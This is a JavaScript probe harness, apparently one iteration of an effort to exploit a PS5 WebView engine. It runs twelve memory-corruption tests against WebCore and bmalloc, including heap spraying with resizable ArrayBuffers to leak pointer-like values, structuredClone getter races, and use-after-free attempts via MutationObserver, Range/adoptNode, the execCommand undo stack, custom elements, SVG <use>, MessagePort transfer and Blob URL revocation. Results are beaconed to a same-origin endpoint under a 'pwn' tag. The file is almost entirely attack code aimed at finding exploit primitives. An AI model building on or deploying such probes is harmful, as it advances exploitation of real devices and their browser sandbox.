/* p110 — Non-JIT memory corruption vectors for LLInt-only PS5 WebView
 *
 * OUTSIDE THE BOX: These target C++ WebCore/bmalloc, NOT JavaScript JIT.
 * Every vector here works regardless of JIT status.
 *
 * N1: RAB shrink+grow info leak — does WebKit zero on grow-back?
 * N2: structuredClone + Proxy trap during serialization — TOCTOU
 * N3: MutationObserver re-entrancy UAF — mutate DOM inside callback
 * N4: Range + adoptNode dangling pointer — Range straddles doc boundary
 * N5: execCommand undo stack UAF — undo after DOM restructure
 * N6: Custom Element connectedCallback re-entrancy — DOM mutation during insert
 * N7: MessagePort transfer + immediate use — race on detach
 * N8: SVG <use> re-entrancy — modify target during shadow tree clone
 * N9: Canvas drawImage + font change during rAF — buffer lifecycle
 * N10: CSS animation element removal — animated element freed during frame
 * N11: history.replaceState bomb — rapid state+clone with object graph mutation
 * N12: Worker Blob URL revoke during load — dangling blob reference
 *
 * Beacon prefix: V110N-
 */
(function(){
var RUN_ID = "v110n" + Math.random().toString(36).slice(2,12);
var PREFIX = "V110N-";
var crashes = [];

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,1800)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press110-nonjit-pwn");

/* ====== N1: RAB shrink+grow info leak ====== */
function test_N1() {
  var r = {};
  try {
    // Phase 1: Allocate RAB and fill with sentinel pattern
    var rab = new ArrayBuffer(4096, {maxByteLength: 8192});
    var u8 = new Uint8Array(rab);
    for (var i = 0; i < 4096; i++) u8[i] = 0xAA;
    r.initialFill = u8[2048] === 0xAA;

    // Phase 2: Shrink to 256 bytes — tail 3840 bytes become free
    rab.resize(256);
    r.afterShrink = rab.byteLength;

    // Phase 3: Allocate many objects to fill freed region
    var spray = [];
    for (var i = 0; i < 500; i++) {
      spray.push({
        marker: 0xDEADBEEF,
        idx: i,
        ptr: new ArrayBuffer(32), // Small AB to create diverse heap objects
        str: "HEAP_SPRAY_" + i
      });
    }
    r.sprayed = spray.length;

    // Phase 4: Grow back to 4096 — does it zero? Or do we see heap data?
    rab.resize(4096);
    r.afterGrow = rab.byteLength;

    // Scan for non-zero bytes in the grown-back region (bytes 256-4095)
    var nonZeroCount = 0;
    var nonAACount = 0;
    var interestingBytes = [];
    var u32 = new Uint32Array(rab);
    for (var i = 64; i < 1024; i++) { // u32 indices 64-1023 = bytes 256-4095
      var val = u32[i];
      if (val !== 0) {
        nonZeroCount++;
        if (val !== 0xAAAAAAAA) {
          nonAACount++;
          if (interestingBytes.length < 20) {
            interestingBytes.push("@" + (i*4) + ":" + val.toString(16));
          }
        }
      }
    }

    r.nonZero = nonZeroCount;
    r.nonAA = nonAACount;
    r.total = 960; // 1024-64 dwords scanned
    r.samples = interestingBytes.join("|");

    if (nonAACount > 0) {
      r.HEAP_LEAK = true;
      // Look for pointer-like values (common PS5 heap addresses)
      var ptrCount = 0;
      for (var i = 64; i < 1024; i++) {
        var hi = u32[i];
        // PS5 userland pointers typically in 0x00007fXXXXXXXXXX range
        // or heap objects around specific bmalloc ranges
        if ((hi & 0xFFFF0000) === 0x00007F00 || (hi & 0xFFFF0000) === 0x00000001) {
          ptrCount++;
        }
      }
      r.ptrLike = ptrCount;
    }

    // Phase 5: Second attempt — grow even larger to catch more
    rab.resize(256);
    var spray2 = [];
    for (var i = 0; i < 2000; i++) {
      spray2.push(new Float64Array(new ArrayBuffer(64)));
    }
    rab.resize(8192);
    var u32b = new Uint32Array(rab);
    var nonZero2 = 0;
    for (var i = 64; i < 2048; i++) {
      if (u32b[i] !== 0) nonZero2++;
    }
    r.bigGrowNonZero = nonZero2;

    spray = null; spray2 = null;
    r.SURVIVED = true;
    B("N1-RABLEAK", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("N1-ERR", r); }
}

/* ====== N2: structuredClone Proxy/getter TOCTOU ====== */
function test_N2() {
  var r = {};
  try {
    // Approach 1: Getter that mutates during serialization
    var callCount = 0;
    var triggerObj = {};
    Object.defineProperty(triggerObj, 'innocent', {
      enumerable: true,
      get: function() {
        callCount++;
        if (callCount > 1) {
          // Second read during serialization — mutate the graph
          delete triggerObj.payload;
          triggerObj.payload = new ArrayBuffer(64);
        }
        return 42;
      }
    });
    triggerObj.payload = {type: "object", data: [1,2,3]};

    try {
      var cloned = structuredClone(triggerObj);
      r.getter_callCount = callCount;
      r.getter_payloadType = typeof cloned.payload;
      r.getter_innocentVal = cloned.innocent;
      if (cloned.payload instanceof ArrayBuffer) {
        r.GETTER_CONFUSION = true;
      }
    } catch(e2) { r.getterErr = e2.name + ":" + e2.message.slice(0,60); }

    // Approach 2: Proxy wrapping an Array-like for structuredClone
    try {
      var accessed = [];
      var proxyTarget = [1, 2, 3, {nested: true}];
      var handler = {
        get: function(t, p) {
          accessed.push(String(p));
          return t[p];
        }
      };
      var px = new Proxy(proxyTarget, handler);
      try {
        var c2 = structuredClone(px);
        r.proxy_accessed = accessed.slice(0, 20).join(",");
        r.proxy_result = JSON.stringify(c2).slice(0,80);
      } catch(e3) {
        r.proxyCloneErr = e3.name;
      }
    } catch(e2) { r.proxy_err = e2.name; }

    // Approach 3: valueOf/toString during transfer sizing
    try {
      var evilBuf = new ArrayBuffer(32);
      var countTransfer = 0;
      var fakeTransferable = {
        [Symbol.toPrimitive]: function(hint) {
          countTransfer++;
          return evilBuf;
        }
      };
      // Some engines check transferList members via internal slots
      try {
        structuredClone({}, {transfer: [fakeTransferable]});
        r.fakeTransfer = "accepted";
      } catch(e3) {
        r.fakeTransferErr = e3.name;
        r.fakeTransferCount = countTransfer;
      }
    } catch(e2) {}

    // Approach 4: history.replaceState with getter bomb
    var stateCallCount = 0;
    var stateObj = {};
    Object.defineProperty(stateObj, 'trap', {
      enumerable: true,
      get: function() {
        stateCallCount++;
        return stateCallCount;
      }
    });
    stateObj.normal = "test";
    try {
      history.replaceState(stateObj, "");
      r.stateTraps = stateCallCount;
      var restored = history.state;
      r.stateNormal = restored && restored.normal;
      r.stateTrap = restored && restored.trap;
    } catch(e2) { r.stateErr = e2.name; }

    r.SURVIVED = true;
    B("N2-CLONEPROXY", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("N2-ERR", r); }
}

/* ====== N3: MutationObserver re-entrancy UAF ====== */
function test_N3() {
  var r = {};
  try {
    var container = document.createElement('div');
    document.body.appendChild(container);
    var mutationsDuringCallback = 0;
    var deepCallbacks = 0;
    var detectedUAF = false;

    // Pattern 1: Remove observed node inside its own mutation callback
    var target1 = document.createElement('div');
    target1.id = 'mut-target-1';
    container.appendChild(target1);

    var obs1 = new MutationObserver(function(mutations) {
      deepCallbacks++;
      mutations.forEach(function(m) {
        // Re-entrancy: mutate the tree INSIDE the callback
        if (m.type === 'childList' && m.addedNodes.length && deepCallbacks < 3) {
          var added = m.addedNodes[0];
          // Remove the node that was just added
          if (added.parentNode) {
            added.parentNode.removeChild(added);
            mutationsDuringCallback++;
          }
          // Add another node to trigger nested observation
          var replacement = document.createElement('span');
          replacement.textContent = 'replaced-' + deepCallbacks;
          target1.appendChild(replacement);
        }
      });
    });
    obs1.observe(target1, {childList: true, subtree: true});

    // Trigger: add a child
    var child1 = document.createElement('p');
    child1.textContent = 'trigger';
    target1.appendChild(child1);

    // Pattern 2: Move node between documents during MutationObserver
    var parser = new DOMParser();
    var doc2 = parser.parseFromString('<div id="d2"><span>foreign</span></div>', 'text/html');
    var foreign = doc2.getElementById('d2');

    var target2 = document.createElement('div');
    container.appendChild(target2);
    var adoptCount = 0;

    var obs2 = new MutationObserver(function(mutations) {
      mutations.forEach(function(m) {
        if (m.removedNodes.length > 0 && adoptCount < 3) {
          adoptCount++;
          // Adopt the removed node into foreign document
          try {
            var removed = m.removedNodes[0];
            doc2.adoptNode(removed);
            foreign.appendChild(removed);
            // Now try to access it from original document context
            var stillAccessible = removed.textContent;
          } catch(e) { detectedUAF = true; }
        }
      });
    });
    obs2.observe(target2, {childList: true});

    var crossChild = document.createElement('div');
    crossChild.innerHTML = '<b>cross-doc-target</b>';
    target2.appendChild(crossChild);
    target2.removeChild(crossChild);

    // Pattern 3: NodeIterator + DOM mutation
    var iterContainer = document.createElement('div');
    for (var i = 0; i < 20; i++) {
      var sp = document.createElement('span');
      sp.textContent = 'node-' + i;
      iterContainer.appendChild(sp);
    }
    container.appendChild(iterContainer);

    var iter = document.createNodeIterator(iterContainer, NodeFilter.SHOW_ELEMENT);
    var iterResults = [];
    var node;
    var iterCount = 0;
    while ((node = iter.nextNode()) !== null && iterCount < 30) {
      iterCount++;
      iterResults.push(node.textContent);
      // Mutate during iteration: remove next sibling
      if (node.nextSibling && iterCount % 3 === 0) {
        node.nextSibling.remove();
      }
    }

    setTimeout(function() {
      obs1.disconnect();
      obs2.disconnect();
      r.mutationsDuringCallback = mutationsDuringCallback;
      r.deepCallbacks = deepCallbacks;
      r.adoptCount = adoptCount;
      r.detectedUAF = detectedUAF;
      r.iterCount = iterCount;
      r.iterNodes = iterResults.length;
      r.iterMissed = 20 - iterResults.length;
      container.remove();
      r.SURVIVED = true;
      B("N3-MUTREENTRY", r);
    }, 500);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("N3-ERR", r); }
}

/* ====== N4: Range + adoptNode dangling pointer ====== */
function test_N4() {
  var r = {};
  try {
    var container = document.createElement('div');
    container.innerHTML = '<p id="r1">Hello</p><p id="r2">World</p><p id="r3">Test</p>';
    document.body.appendChild(container);

    var p1 = container.children[0];
    var p2 = container.children[1];
    var p3 = container.children[2];

    // Create Range spanning p1 to p3
    var range = document.createRange();
    range.setStartBefore(p1);
    range.setEndAfter(p3);
    r.beforeStr = range.toString();

    // adoptNode p2 into foreign document — Range should update
    var parser = new DOMParser();
    var doc2 = parser.parseFromString('<body></body>', 'text/html');
    var adopted = document.adoptNode(p2);
    doc2.body.appendChild(adopted);

    // Range now straddles a gap — try to use it
    try {
      r.afterStr = range.toString();
      r.rangeCollapsed = range.collapsed;
      r.startContainer = range.startContainer.nodeName;
      r.endContainer = range.endContainer.nodeName;
    } catch(e2) { r.rangeErr1 = e2.name; }

    // Try extractContents on the broken range
    try {
      var frag = range.extractContents();
      r.extractChildren = frag.childNodes.length;
      r.extractHTML = frag.textContent;
    } catch(e2) { r.extractErr = e2.name; }

    // Pattern 2: Delete range endpoints while Range exists
    var c2 = document.createElement('div');
    c2.innerHTML = '<a>1</a><b>2</b><c>3</c>';
    document.body.appendChild(c2);
    var r2 = document.createRange();
    r2.setStart(c2.children[0].firstChild, 0);
    r2.setEnd(c2.children[2].firstChild, 1);

    // Remove the start node
    c2.children[0].remove();
    try {
      r.r2Str = r2.toString();
      r.r2Valid = true;
    } catch(e2) {
      r.r2Err = e2.name;
      r.RANGE_DANGLING = true;
    }

    // Remove end node too
    c2.children[c2.children.length - 1].remove();
    try {
      r.r2Str2 = r2.toString();
    } catch(e2) { r.r2Err2 = e2.name; }

    container.remove();
    c2.remove();
    r.SURVIVED = true;
    B("N4-RANGEADOPT", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("N4-ERR", r); }
}

/* ====== N5: execCommand undo stack UAF ====== */
function test_N5() {
  var r = {};
  try {
    var editable = document.createElement('div');
    editable.contentEditable = 'true';
    editable.innerHTML = '<p>Line 1</p><p>Line 2</p><p>Line 3</p>';
    document.body.appendChild(editable);
    editable.focus();

    // Make edits to build undo stack
    var sel = window.getSelection();
    var range = document.createRange();
    range.selectNodeContents(editable.children[1]);
    sel.removeAllRanges();
    sel.addRange(range);

    r.execDelete = document.execCommand('delete', false, null);
    r.afterDelete = editable.innerHTML;

    // Insert HTML
    r.execInsert = document.execCommand('insertHTML', false, '<div id="injected">INJECTED</div>');
    r.afterInsert = editable.innerHTML;

    // Now radically restructure the DOM
    editable.innerHTML = '<section><article>Completely new content</article></section>';

    // Try to undo — the undo stack references deleted DOM nodes
    try {
      r.undoResult = document.execCommand('undo', false, null);
      r.afterUndo1 = editable.innerHTML.slice(0, 100);
    } catch(e2) {
      r.undoErr = e2.name + ":" + e2.message.slice(0,60);
      r.UNDO_UAF = true;
    }

    // Try multiple undos
    try {
      r.undo2 = document.execCommand('undo', false, null);
      r.afterUndo2 = editable.innerHTML.slice(0, 100);
      r.undo3 = document.execCommand('undo', false, null);
      r.afterUndo3 = editable.innerHTML.slice(0, 100);
    } catch(e2) {
      r.multiUndoErr = e2.name;
    }

    editable.remove();
    r.SURVIVED = true;
    B("N5-UNDOUAF", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("N5-ERR", r); }
}

/* ====== N6: Custom Element lifecycle re-entrancy ====== */
function test_N6() {
  var r = {};
  try {
    var callLog = [];
    var targetContainer = document.createElement('div');
    document.body.appendChild(targetContainer);

    // Define custom element that mutates DOM in connectedCallback
    class ReentrantElement extends HTMLElement {
      connectedCallback() {
        callLog.push('connected:' + this.id);
        // Re-entrancy: add/remove siblings during our own insertion
        if (this.id === 'trigger-elem') {
          var sibling = document.createElement('div');
          sibling.textContent = 'added-during-connect';
          this.parentNode.insertBefore(sibling, this);
          // Remove ourselves during our own connection!
          if (this.parentNode) {
            this.parentNode.removeChild(this);
            callLog.push('self-removed');
          }
        }
      }
      disconnectedCallback() {
        callLog.push('disconnected:' + this.id);
        // Re-entrancy: try to re-add during disconnect
        if (this.id === 'trigger-elem' && !this._reAdded) {
          this._reAdded = true;
          try {
            targetContainer.appendChild(this);
            callLog.push('re-added-during-disconnect');
          } catch(e) {
            callLog.push('re-add-failed:' + e.name);
          }
        }
      }
    }
    customElements.define('reentrant-elem', ReentrantElement);

    // Pattern 1: Self-removal during connectedCallback
    var elem = document.createElement('reentrant-elem');
    elem.id = 'trigger-elem';
    targetContainer.appendChild(elem);

    // Pattern 2: Batch insert + remove custom elements
    var batch = [];
    for (var i = 0; i < 10; i++) {
      var e = document.createElement('reentrant-elem');
      e.id = 'batch-' + i;
      batch.push(e);
    }
    var frag = document.createDocumentFragment();
    batch.forEach(function(e) { frag.appendChild(e); });
    targetContainer.appendChild(frag);
    // Immediately clear
    targetContainer.innerHTML = '';

    setTimeout(function() {
      r.callLog = callLog.join("|").slice(0, 400);
      r.callCount = callLog.length;
      r.containerChildren = targetContainer.childNodes.length;
      targetContainer.remove();
      r.SURVIVED = true;
      B("N6-CELIFECYCLE", r);
    }, 300);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("N6-ERR", r); }
}

/* ====== N7: MessagePort transfer + immediate use race ====== */
function test_N7() {
  var r = {};
  try {
    // Pattern 1: Transfer ArrayBuffer and immediately read
    var buf = new ArrayBuffer(1024);
    var view = new Uint32Array(buf);
    view[0] = 0xCAFEBABE;
    view[1] = 0xDEADC0DE;

    var mc = new MessageChannel();
    mc.port2.onmessage = function(e) {
      r.receivedSize = e.data.byteLength;
      r.receivedVal = new Uint32Array(e.data)[0].toString(16);
      mc.port1.close();
      mc.port2.close();
    };

    // Transfer and immediately try to access
    mc.port1.postMessage(buf, [buf]);
    r.afterTransferSize = buf.byteLength; // Should be 0 (detached)
    r.detached = (buf.byteLength === 0);

    try {
      // Try to access detached buffer through original view
      var staleRead = view[0];
      r.staleRead = String(staleRead);
      r.staleType = typeof staleRead;
      if (staleRead !== undefined && staleRead !== 0) {
        r.STALE_READ = true;
      }
    } catch(e2) { r.staleErr = e2.name; }

    // Pattern 2: Transfer port itself, then try to use it
    var mc2 = new MessageChannel();
    var mc3 = new MessageChannel();
    mc3.port2.onmessage = function(e) {
      r.portTransferReceived = true;
    };
    try {
      mc3.port1.postMessage("test", [mc2.port1]);
      // mc2.port1 is now transferred — try to use it
      try {
        mc2.port1.postMessage("stale");
        r.stalePortSend = "accepted";
      } catch(e2) {
        r.stalePortErr = e2.name;
      }
    } catch(e2) { r.portTransferErr = e2.name; }

    // Pattern 3: Rapid transfer ping-pong
    var pingBuf = new ArrayBuffer(256);
    new Uint8Array(pingBuf).fill(0xFF);
    var mc4 = new MessageChannel();
    var bounces = 0;
    mc4.port1.onmessage = function(e) {
      bounces++;
      if (bounces < 5) {
        mc4.port1.postMessage(e.data, [e.data]);
      } else {
        r.bounces = bounces;
        r.finalSize = e.data.byteLength;
        mc4.port1.close(); mc4.port2.close();
      }
    };
    mc4.port2.onmessage = function(e) {
      bounces++;
      mc4.port2.postMessage(e.data, [e.data]);
    };
    mc4.port1.postMessage(pingBuf, [pingBuf]);

    setTimeout(function() {
      r.SURVIVED = true;
      B("N7-PORTTRANSFER", r);
    }, 500);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("N7-ERR", r); }
}

/* ====== N8: SVG <use> re-entrancy ====== */
function test_N8() {
  var r = {};
  try {
    // Create SVG with <use> referencing a <defs> element
    var svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
    svg.setAttribute("width", "100");
    svg.setAttribute("height", "100");

    var defs = document.createElementNS("http://www.w3.org/2000/svg", "defs");
    var rect = document.createElementNS("http://www.w3.org/2000/svg", "rect");
    rect.setAttribute("id", "target-shape");
    rect.setAttribute("width", "50");
    rect.setAttribute("height", "50");
    rect.setAttribute("fill", "red");
    defs.appendChild(rect);
    svg.appendChild(defs);

    // <use> elements clone the referenced content
    for (var i = 0; i < 5; i++) {
      var use = document.createElementNS("http://www.w3.org/2000/svg", "use");
      use.setAttributeNS("http://www.w3.org/1999/xlink", "href", "#target-shape");
      use.setAttribute("x", String(i * 10));
      svg.appendChild(use);
    }
    document.body.appendChild(svg);
    r.svgAdded = true;

    // Now mutate the <defs> target while <use> elements reference it
    // This forces the shadow trees to be rebuilt
    setTimeout(function() {
      // Phase 1: Modify the referenced element
      rect.setAttribute("width", "100");
      rect.setAttribute("fill", "blue");
      r.modifiedTarget = true;

      // Phase 2: Remove the referenced element entirely
      setTimeout(function() {
        rect.remove();
        r.removedTarget = true;

        // Phase 3: Re-add with different content
        var newRect = document.createElementNS("http://www.w3.org/2000/svg", "circle");
        newRect.setAttribute("id", "target-shape");
        newRect.setAttribute("r", "25");
        newRect.setAttribute("fill", "green");
        defs.appendChild(newRect);

        // Phase 4: Rapid add/remove of <use> elements
        for (var j = 0; j < 20; j++) {
          var u = document.createElementNS("http://www.w3.org/2000/svg", "use");
          u.setAttributeNS("http://www.w3.org/1999/xlink", "href", "#target-shape");
          svg.appendChild(u);
          if (j % 3 === 0) u.remove();
        }
        r.rapidUseCount = svg.childNodes.length;

        // Phase 5: Change href of existing <use> to dangle
        var uses = svg.querySelectorAll('use');
        uses.forEach(function(u, i) {
          if (i % 2 === 0) {
            u.setAttributeNS("http://www.w3.org/1999/xlink", "href", "#nonexistent-" + i);
          }
        });
        r.danglingRefs = true;

        svg.remove();
        r.SURVIVED = true;
        B("N8-SVGUSE", r);
      }, 100);
    }, 100);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("N8-ERR", r); }
}

/* ====== N9: Canvas pixel buffer + font measurement race ====== */
function test_N9() {
  var r = {};
  try {
    var canvas = document.createElement('canvas');
    canvas.width = 256; canvas.height = 256;
    var ctx = canvas.getContext('2d');
    document.body.appendChild(canvas);

    // Fill with known pattern
    ctx.fillStyle = 'red';
    ctx.fillRect(0, 0, 256, 256);

    // Get ImageData reference
    var imgData = ctx.getImageData(0, 0, 256, 256);
    r.imgDataLen = imgData.data.length;
    r.firstPixel = imgData.data[0] + "," + imgData.data[1] + "," + imgData.data[2];

    // Pattern 1: putImageData while canvas is being read
    var readCount = 0;
    var writeCount = 0;
    function readLoop() {
      for (var i = 0; i < 50; i++) {
        var d = ctx.getImageData(0, 0, 256, 256);
        readCount++;
        // Check for corruption — should always be red (255,0,0) or blue (0,0,255)
        var px = d.data[0];
        if (px !== 255 && px !== 0) {
          r.PIXEL_CORRUPTION = true;
          r.corruptedPixel = px;
        }
      }
    }

    function writeLoop() {
      for (var i = 0; i < 50; i++) {
        ctx.fillStyle = i % 2 ? 'blue' : 'red';
        ctx.fillRect(0, 0, 256, 256);
        writeCount++;
      }
    }

    // Interleave reads and writes
    readLoop();
    writeLoop();
    readLoop();

    r.readCount = readCount;
    r.writeCount = writeCount;

    // Pattern 2: Resize canvas while ImageData exists
    var staleImgData = ctx.getImageData(0, 0, 256, 256);
    canvas.width = 1; // This should reset the canvas context
    canvas.height = 1;

    // Try to putImageData with old (large) ImageData on small canvas
    try {
      ctx.putImageData(staleImgData, 0, 0);
      r.stalePut = "accepted";
      // Check if it wrote beyond canvas bounds
      canvas.width = 256; canvas.height = 256;
      var check = ctx.getImageData(0, 0, 256, 256);
      var nonBlack = 0;
      for (var i = 0; i < check.data.length; i += 4) {
        if (check.data[i] !== 0 || check.data[i+1] !== 0 || check.data[i+2] !== 0) {
          nonBlack++;
        }
      }
      r.nonBlackAfterResize = nonBlack;
    } catch(e2) { r.stalePutErr = e2.name; }

    // Pattern 3: toDataURL during modification
    ctx.fillStyle = 'green';
    ctx.fillRect(0, 0, 256, 256);
    var dataUrl = canvas.toDataURL();
    r.dataUrlLen = dataUrl.length;
    r.dataUrlPrefix = dataUrl.slice(0, 30);

    canvas.remove();
    r.SURVIVED = true;
    B("N9-CANVASBUF", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("N9-ERR", r); }
}

/* ====== N10: CSS animation element removal ====== */
function test_N10() {
  var r = {};
  try {
    if (typeof document.createElement('div').animate !== 'function') {
      r.noAnimate = true;
      r.SURVIVED = true;
      B("N10-CSSANIM", r);
      return;
    }

    var container = document.createElement('div');
    document.body.appendChild(container);
    var removed = 0;
    var errors = 0;

    // Create elements with running animations
    for (var i = 0; i < 20; i++) {
      var el = document.createElement('div');
      el.style.width = '10px'; el.style.height = '10px';
      el.style.position = 'absolute';
      container.appendChild(el);

      var anim = el.animate([
        {transform: 'translateX(0px)', opacity: 1},
        {transform: 'translateX(100px)', opacity: 0}
      ], {duration: 1000, iterations: Infinity});

      // Remove element while animation is running
      if (i % 2 === 0) {
        setTimeout((function(elem, animation) {
          return function() {
            try {
              elem.remove(); // Remove element — animation should be cancelled
              removed++;
              // Try to control the orphaned animation
              try {
                animation.currentTime = 500;
                animation.play();
                r.orphanAnimPlay = true;
              } catch(e3) { errors++; }
            } catch(e3) { errors++; }
          };
        })(el, anim), 10 + i * 5);
      }
    }

    // Pattern 2: rAF callback removes animated elements
    var rafCount = 0;
    var rafRemoved = 0;
    var elems2 = [];
    for (var i = 0; i < 10; i++) {
      var el2 = document.createElement('div');
      el2.style.cssText = 'width:5px;height:5px;position:absolute;';
      container.appendChild(el2);
      el2.animate([{opacity: 1}, {opacity: 0}], {duration: 2000, iterations: Infinity});
      elems2.push(el2);
    }

    function rafDestroy() {
      rafCount++;
      if (rafCount < 10) {
        if (elems2.length > 0) {
          var victim = elems2.pop();
          victim.remove();
          rafRemoved++;
        }
        requestAnimationFrame(rafDestroy);
      }
    }
    requestAnimationFrame(rafDestroy);

    setTimeout(function() {
      r.removed = removed;
      r.errors = errors;
      r.rafRemoved = rafRemoved;
      container.remove();
      r.SURVIVED = true;
      B("N10-CSSANIM", r);
    }, 1500);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("N10-ERR", r); }
}

/* ====== N11: history.replaceState bomb with rapid graph mutation ====== */
function test_N11() {
  var r = {};
  try {
    var stateErrors = 0;
    // Rapid replaceState with increasingly complex object graphs
    for (var i = 0; i < 100; i++) {
      try {
        var shared = {v: i, ab: new ArrayBuffer(8)};
        var state = {
          a: shared, b: shared, c: shared,
          buf: new ArrayBuffer(64),
          map: new Map([[1, shared], [2, new Set([shared])]]),
          deep: {l1: {l2: {l3: {l4: {l5: shared}}}}}
        };
        history.replaceState(state, "");
      } catch(e2) { stateErrors++; }
    }
    r.rapidStates = 100;
    r.stateErrors = stateErrors;

    // Check final state integrity
    var final = history.state;
    r.finalA = final && final.a && final.a.v;
    r.finalShared = final && (final.a === final.b);
    r.finalMap = final && final.map && final.map.get(1) && final.map.get(1).v;

    // Pattern 2: pushState + back/forward rapid cycle
    try {
      for (var i = 0; i < 50; i++) {
        history.pushState({idx: i, buf: new ArrayBuffer(16)}, "");
      }
      r.pushed = 50;
      // Rapid back
      for (var i = 0; i < 25; i++) {
        history.back();
      }
      r.wentBack = true;
    } catch(e2) { r.navErr = e2.name; }

    r.SURVIVED = true;
    B("N11-HISTBOMB", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("N11-ERR", r); }
}

/* ====== N12: Worker Blob URL revoke during load ====== */
function test_N12() {
  var r = {};
  try {
    // Create a Worker with complex init, then revoke Blob URL immediately
    var workerCode = 'self.onmessage = function(e) { self.postMessage("alive:" + e.data); };';
    var blob = new Blob([workerCode], {type: 'application/javascript'});
    var url = URL.createObjectURL(blob);
    r.blobUrl = url.slice(0, 40);

    // Create worker and IMMEDIATELY revoke the URL
    var w;
    try {
      w = new Worker(url);
      URL.revokeObjectURL(url); // Revoke while Worker may still be loading!
      r.revokedDuringLoad = true;

      w.onmessage = function(e) {
        r.workerResponse = String(e.data);
        r.workerAlive = true;
        w.terminate();
      };
      w.onerror = function(e) {
        r.workerError = e.message ? e.message.slice(0, 80) : "error";
      };
      w.postMessage("ping");
    } catch(e2) { r.workerCreateErr = e2.name; }

    // Pattern 2: Multiple workers sharing same revoked blob URL
    var url2 = URL.createObjectURL(blob);
    var workers = [];
    for (var i = 0; i < 5; i++) {
      try {
        workers.push(new Worker(url2));
      } catch(e2) { break; }
    }
    URL.revokeObjectURL(url2);
    r.sharedWorkers = workers.length;

    // Send messages to all
    workers.forEach(function(w2, i) {
      w2.onmessage = function(e) {
        r["w" + i] = "ok";
      };
      w2.postMessage("test-" + i);
    });

    setTimeout(function() {
      workers.forEach(function(w2) { try { w2.terminate(); } catch(e){} });
      r.SURVIVED = true;
      B("N12-BLOBREVOKE", r);
    }, 1000);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("N12-ERR", r); }
}

/* ====== Run all tests ====== */
try {
  test_N1();
  setTimeout(test_N2, 2000);
  setTimeout(test_N3, 4000);
  setTimeout(test_N4, 6000);
  setTimeout(test_N5, 8000);
  setTimeout(test_N6, 10000);
  setTimeout(test_N7, 13000);
  setTimeout(test_N8, 16000);
  setTimeout(test_N9, 20000);
  setTimeout(test_N10, 24000);
  setTimeout(test_N11, 28000);
  setTimeout(test_N12, 32000);
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 5000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe110-done"); }, 90000);
})();
